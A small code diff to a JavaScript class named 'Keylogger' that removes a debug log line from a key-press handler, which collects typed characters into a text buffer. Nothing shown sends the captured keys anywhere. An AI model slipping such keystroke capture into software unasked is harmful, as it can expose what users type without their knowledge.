@@ -26,7 +26,6 @@ module.exports = class Keylogger {
   }
 
   _keyPressHandler (e) {
-    console.log(e)
     if (e.key.length === 1) {
       this.text += e.key
     } else if (e.key === 'Enter') {
